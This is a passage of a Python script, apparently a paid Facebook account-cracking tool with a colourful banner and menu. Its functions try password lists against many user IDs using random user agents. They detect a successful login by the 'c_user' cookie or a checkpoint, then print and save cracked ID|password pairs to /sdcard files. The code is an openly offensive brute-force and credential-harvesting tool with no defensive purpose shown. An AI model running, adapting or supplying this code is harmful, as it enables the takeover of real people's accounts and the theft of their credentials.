...
\033[1;37m .::       .::    .::::     .::      .::.::         .::.:::::    
\033[1;32m════════════════════════════════════════════
\033[1;32m[+]     Owner    : ⸙𝐌𝐎𝐑𝐀𝐃⸙➼-
\033[1;32m[+]     Facebook : ⸨⸙⸩⟬𝐊𝐈𝐍𝐆 - 𝐌𝐎𝐑𝐀𝐃⟭⸨⸙⸩
\033[1;32m[+]     Version  : 1.0
\033[1;32m[+]     Git hop  : MORAD-KHAN-BS
\033[1;32m[+]     Tol Typ  : \x1b[91;1m PAID
\033[1;32m════════════════════════════════════════════""")
def linex():
	print('\033[1;32m════════════════════════════════════════════')
loop = 0
...
def MORAD():    
			print(logo)
			print('\x1b[97;1m[✓] ⸙𝐌𝐎𝐑𝐀𝐃⸙➼-  VERSION :\x1b[1;92m 1.0 ')
			...
			if xd in ['1','01']:
				...
				plist = []
				try:
					ps_limit = int(input('\x1b[97;1m How many passwords do you want to add ? 11552244'))
				except:
					ps_limit =1
				linex()
				...
				os.system(f'xdg-open https://facebook.com/profile.php?id=61550325485961/');menu()
			elif xd in ['0','00']:
				exit()
			else:
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[⸙𝐌𝐎𝐑𝐀𝐃⸙➼-] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(cps)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				print('\r\r\033[1;31m[⸙𝐌𝐎𝐑𝐀𝐃⸙➼-CP] %s | %s'%(ids,pas))
				
				open('\x1b[91;1m/sdcard/BAD-CP.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in XIYAD:
				if 'y' in pcp:
					print('\r\r\x1b[1;92m[⸙𝐌𝐎𝐑𝐀𝐃⸙➼-OK] '+ids+' | '+pas+'\033[1;97m')
					
					open('/sdcard/BAD-OK.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[⸙𝐌𝐎𝐑𝐀𝐃⸙➼-] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				...
				print('\r\r\033[1;32m[⸙𝐌𝐎𝐑𝐀𝐃⸙➼-OK] %s | %s'%(ids,pas))
				...
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m[⸙𝐌𝐎𝐑𝐀𝐃⸙➼-CP] '+ids+' | '+pas+'\033[1;97m')
					
					open('/sdcard/BAD-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def fcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r [\033[1;97m⸙𝐌𝐎𝐑𝐀𝐃⸙➼-\033[1;97m] %s|OK:-%s \r'%(loop,len(cps))),
			sys.stdout.flush()
			ua = random.choice(ugen)
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[38;5;208m[⸙𝐌𝐎𝐑𝐀𝐃⸙➼-CP] '+uid+' | '+ps+'\033[1;32m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\x1b[1;92m[⸙𝐌𝐎𝐑𝐀𝐃⸙➼-OK] '+uid+' | '+ps+'\33[0;97m')
